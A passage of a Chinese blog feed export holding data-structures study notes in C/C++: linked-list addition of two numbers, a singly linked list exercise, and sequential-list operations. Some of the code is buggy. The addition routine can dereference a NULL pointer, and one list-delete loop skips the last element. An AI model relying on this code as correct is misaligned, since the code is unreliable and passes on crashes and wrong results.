&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">l3</span>;</span><br> l3 = (<span class="hljs-keyword">struct</span> ListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>     l3-&gt;next = <span class="hljs-literal">NULL</span>;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">p</span> =</span> l1;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">q</span> =</span> l2;<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">r</span> =</span> l3;<br> <span class="hljs-type">int</span> next = <span class="hljs-number">0</span>;<br>     <span class="hljs-type">int</span> total;<br> <span class="hljs-keyword">while</span>( p != <span class="hljs-literal">NULL</span> || q != <span class="hljs-literal">NULL</span>||next!=<span class="hljs-number">0</span>) &#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">tem</span> =</span> (<span class="hljs-keyword">struct</span> ListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>         <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span>&amp;&amp;q==<span class="hljs-literal">NULL</span>)&#123;<br>             total = next;<br>         &#125;<span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>    total = q-&gt;val + next;<br>            q=q-&gt;next;<br>     &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(q== <span class="hljs-literal">NULL</span>)&#123;<br>            total = p-&gt;val + next;<br>            p=p-&gt;next;<br>         &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(q!=<span class="hljs-literal">NULL</span>&amp;&amp;q!=<span class="hljs-literal">NULL</span>)&#123;<br>            total = (p-&gt;val + q-&gt;val + next);<br>            p=p-&gt;next;<br>            q=q-&gt;next;<br>         &#125;<br> tem-&gt;val = total %<span class="hljs-number">10</span>;<br> next = total / <span class="hljs-number">10</span>;<br> r-&gt;next = tem;<br>         tem-&gt;next = <span class="hljs-literal">NULL</span>;<br> r = tem;<br>         <br>         <br> &#125;<br> <br> <br> <span class="hljs-keyword">return</span> l3-&gt;next;<br> &#125;<br></code></pre></td></tr></table></figure><h1>5、编程实践</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs C">using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;ctype.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>          //定义结点</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">char</span> data[<span class="hljs-number">10</span>];             <span class="hljs-comment">//结点的数据域为字符串</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span>      <span class="hljs-comment">//结点的指针域</span><br>&#125;ListNode,*LinkList;<br>         <span class="hljs-comment">// 自定义LinkList单链表类型</span><br><br>LinkList <span class="hljs-title function_">CreatList</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;            <span class="hljs-comment">//函数，用头插入法建立带头结点的单链表</span><br>LinkList <span class="hljs-title function_">LocateNode</span><span class="hljs-params">(LinkList L, <span class="hljs-type">char</span> *ch)</span>;      <span class="hljs-comment">//函数，按值查找结点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteList</span><span class="hljs-params">(LinkList L, <span class="hljs-type">char</span> *ch)</span>;           <span class="hljs-comment">//函数，删除指定值的结点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Printlist</span><span class="hljs-params">(LinkList L)</span>;                    <span class="hljs-comment">//函数，打印链表中的所有值</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteAll</span><span class="hljs-params">(LinkList L)</span>;                   <span class="hljs-comment">//函数，删除所有结点，释放内存</span><br>LinkList <span class="hljs-title function_">AddNode</span><span class="hljs-params">(LinkList L)</span>; <span class="hljs-comment">//修改程序：增加节点。用头插法，返回头指针</span><br><br><span class="hljs-comment">//==========主函数==============</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> ch[<span class="hljs-number">10</span>], num[<span class="hljs-number">5</span>];<br>LinkList head;<br>head = CreatList();          <span class="hljs-comment">//用头插入法建立单链表，返回头指针</span><br>Printlist(head);             <span class="hljs-comment">//遍历链表输出其值</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; Delete node (y/n):&quot;</span>);  <span class="hljs-comment">//输入&quot;y&quot;或&quot;n&quot;去选择是否删除结点</span><br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, num,<span class="hljs-keyword">sizeof</span>(num));<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(num, <span class="hljs-string">&quot;y&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(num, <span class="hljs-string">&quot;Y&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input Delete_data:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, ch,<span class="hljs-keyword">sizeof</span>(ch));        <span class="hljs-comment">//输入要删除的字符串</span><br>DeleteList(head, ch);<br>Printlist(head);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; Add node ? (y/n):&quot;</span>);  <span class="hljs-comment">//输入&quot;y&quot;或&quot;n&quot;去选择是否增加结点</span><br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, num,<span class="hljs-keyword">sizeof</span>(num));<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(num, <span class="hljs-string">&quot;y&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(num, <span class="hljs-string">&quot;Y&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>head = AddNode(head);<br>&#125;<br><br>Printlist(head);<br>DeleteAll(head);            <span class="hljs-comment">//删除所有结点，释放内存</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//==========用头插入法建立带头结点的单链表===========</span><br>LinkList <span class="hljs-title function_">CreatList</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">char</span> ch[<span class="hljs-number">100</span>];<br>LinkList head;<br>head = new ListNode;<br>head-&gt;next = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input # to end  &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input Node_data:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, ch,<span class="hljs-keyword">sizeof</span>(ch));<br><span class="hljs-comment">//根据输入字符串，插入单链表中。以“#”为结束标志（头插法）</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(ch, <span class="hljs-string">&quot;#&quot;</span>))<br>&#123;<br><br><span class="hljs-keyword">if</span> (LocateNode(head, ch) == <span class="hljs-literal">NULL</span>)<br>&#123;<br>LinkList p = new ListNode;<br>strcpy_s(p-&gt;data, ch);<br>p-&gt;next = head-&gt;next;<br>head-&gt;next = p;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ok\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已存在\n&quot;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">//==========按值查找结点，找到则返回该结点的位置，否则返回NULL==========</span><br>LinkList <span class="hljs-title function_">LocateNode</span><span class="hljs-params">(LinkList head, <span class="hljs-type">char</span> *key)</span><br>&#123;<br>LinkList p = head-&gt;next; <span class="hljs-comment">//从首元结点比较</span><br><span class="hljs-comment">//扫描单链表，按值查找结点。若p=NULL则查找失败，否则p指向找到的值为key的结点</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">while</span> (p&amp;&amp;<span class="hljs-built_in">strcmp</span>(p-&gt;data,key)) &#123;<br>p = p-&gt;next;<br>&#125;<br><span class="hljs-keyword">if</span> (p) &#123;<br><span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//若p=NULL则查找失败，否则p指向找到的值为key的结点</span><br>&#125;<br><br><span class="hljs-comment">//==========按照输入值增加节点=======</span><br>LinkList <span class="hljs-title function_">AddNode</span><span class="hljs-params">(LinkList head)</span><br>&#123;<br><span class="hljs-type">char</span> ch[<span class="hljs-number">10</span>];<br>LinkList s, pp;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nPlease input a New Node_data:&quot;</span>);<br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>, ch,<span class="hljs-keyword">sizeof</span>(ch));           <span class="hljs-comment">//输入各结点的字符串</span><br><span class="hljs-keyword">if</span> (!LocateNode(head, ch)) &#123;<br>s = new ListNode;<br>strcpy_s(s-&gt;data, ch);<br>s-&gt;next = head-&gt;next;<br>head-&gt;next = s;<br><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已存在\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">//若输入字符串与当前链表结点元素均不同，则插入到表头位置</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">return</span> head;<br><br>&#125;<br><br><span class="hljs-comment">//==========删除带头结点的单链表中的指定结点=======</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteList</span><span class="hljs-params">(LinkList head, <span class="hljs-type">char</span> *key)</span><br>&#123;<br>LinkList p, r;<br>p = LocateNode(head, key);    <span class="hljs-comment">//按key值查找结点的</span><br><span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;            <span class="hljs-comment">//若没有找到结点，退出</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;position error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>r = head;<br><span class="hljs-keyword">while</span> (r-&gt;next != p) &#123;<br>r = r-&gt;next;<br>&#125;<br>r-&gt;next = p-&gt;next;<br>delete p;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功\n&quot;</span>);<br><br>&#125;<br>&#125;<br><span class="hljs-comment">//===========打印链表=======</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Printlist</span><span class="hljs-params">(LinkList head)</span><br>&#123;<br>LinkList p = head-&gt;next;       <span class="hljs-comment">//从开始结点打印</span><br><span class="hljs-keyword">while</span> (p) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s,   &quot;</span>, p-&gt;data);<br>p = p-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">//==========删除所有结点，释放空间===========</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteAll</span><span class="hljs-params">(LinkList head)</span><br>&#123;<br>LinkList p = head, r;<br><span class="hljs-keyword">while</span> (p-&gt;next) &#123;<br>r = p-&gt;next;<br>delete p;<br>p = r;<br>&#125;<br>delete p;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5.assets/image-20220204154232488.png" alt="image-20220204154232488"></p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-线性表</title>
    <link href="/2022/02/18/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2022/02/18/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1>顺序表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> *elem; <span class="hljs-comment">//指向数据元素的基地址</span><br><span class="hljs-type">int</span> length;<span class="hljs-comment">//线性表的当前长度</span><br><br>&#125;SqList;<br><br><span class="hljs-comment">//初始化线性表（①地址传递）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList1</span><span class="hljs-params">(SqList *L)</span><br>&#123;<br><span class="hljs-comment">//为顺序表分配空间</span><br>L-&gt;elem = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(MAX_SIZE * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));  <span class="hljs-comment">//为顺序表分配空间   malloc(m)开辟m字节长度的地址空间，并返回这段空间的首地址（指针）</span><br><span class="hljs-keyword">if</span> (!L-&gt;elem) <span class="hljs-built_in">exit</span>(OVERFLOW);  <span class="hljs-comment">//存储分配失败</span><br>L-&gt;length = <span class="hljs-number">0</span>; <span class="hljs-comment">//空表长度为0</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//②引用传递（C++中才有）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitList2</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br>L.elem = new <span class="hljs-type">int</span>[MAX_SIZE];<span class="hljs-comment">//为顺序表分配空间</span><br><span class="hljs-keyword">if</span> (!L.elem)<span class="hljs-built_in">exit</span>(OVERFLOW);<span class="hljs-comment">//存储分配失败</span><br>L.length = <span class="hljs-number">0</span>;<span class="hljs-comment">//空表长度为0</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//销毁线性表L</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DeletList</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br><span class="hljs-keyword">if</span> (L.elem)delete[]L.elem;<span class="hljs-comment">//释放存储空间</span><br>&#125;<br><br><span class="hljs-comment">//清空线性表L</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ClearList</span><span class="hljs-params">(SqList &amp;L)</span><br>&#123;<br>L.length = <span class="hljs-number">0</span>;<span class="hljs-comment">//将线性表长度置为0</span><br>&#125;<br><br><span class="hljs-comment">//求线性表的长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetLength</span><span class="hljs-params">(SqList L)</span><br>&#123;<br><span class="hljs-keyword">return</span> (L.length);<br>&#125;<br><br><span class="hljs-comment">//判断线性表L是否为空</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">IsEmpty</span><span class="hljs-params">(SqList L)</span><br>&#123;<br><span class="hljs-keyword">if</span> (L.length == <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> OK;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//取值（根据位置i获取相应位置数据元素的内容） O(1)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetElem</span><span class="hljs-params">(SqList L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">1</span> || i&gt;L.length)<span class="hljs-keyword">return</span> ERROR; <span class="hljs-comment">//判断是否合理</span><br>e = L.elem[i<span class="hljs-number">-1</span>]; <span class="hljs-comment">//第i-1个单元存储着第i个元素</span><br><span class="hljs-keyword">return</span> OK;<br><br>&#125;<br><br><span class="hljs-comment">//查找（根据指定数据获取数据所在的位置）  O(n)   算法在运行过程中占用常数阶的辅助空间</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">LocalElem</span><span class="hljs-params">(SqList L, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; L.length; i++) &#123;<br><span class="hljs-keyword">if</span> (L.elem[i] == e)<span class="hljs-keyword">return</span> OK;<br>&#125;<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-comment">//插入(在线性表L中第i个数据元素之前插入数据元素e）  O(n)</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ListInsert</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">1</span> || i&gt;L.length + <span class="hljs-number">1</span>)<span class="hljs-keyword">return</span> ERROR;  <span class="hljs-comment">//i值不合法</span><br><span class="hljs-keyword">if</span> (L.length == MAX_SIZE)<span class="hljs-keyword">return</span> ERROR;  <span class="hljs-comment">//当前存储空间已满</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = L.length - <span class="hljs-number">1</span>; j &gt;= i - <span class="hljs-number">1</span>; j--)<br>&#123;<br>L.elem[j + <span class="hljs-number">1</span>] = L.elem[j]; <span class="hljs-comment">//插入位置及之后的元素后移</span><br>&#125;<br>L.elem[i - <span class="hljs-number">1</span>] = e;  <span class="hljs-comment">//将新元素e放入第i个位置</span><br>++L.length;<span class="hljs-comment">//表长加一</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除（删除第i个结点）    O(n)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ListDelete</span><span class="hljs-params">(SqList &amp;L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">1</span> || i&gt;L.length)<span class="hljs-keyword">return</span> ERROR;<br>e = L.elem[i - <span class="hljs-number">1</span>];<span class="hljs-comment">// 将被删除元素赋给e</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt; L.length - <span class="hljs-number">1</span>; j++)<br>&#123;<br>L.elem[j - <span class="hljs-number">1</span>] = L.elem[j]; <span class="hljs-comment">//被删除元素之后的元素往前移</span><br>&#125;<br>--L.length; <span class="hljs-comment">//表长-1</span><br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除（C语言实现）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ListDelete_Sq</span><span class="hljs-params">(SqList *L, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> *e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">1</span> || i&gt;L-&gt;length)<span class="hljs-keyword">return</span> ERROR;<br>*e = L-&gt;elem[i - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt;= L-&gt;length - <span class="hljs-number">1</span>; j++) &#123;<br>L-&gt;elem[j - <span class="hljs-number">1</span>] = L-&gt;elem[j];<br>&#125;<br>--L-&gt;length;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h1>链表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 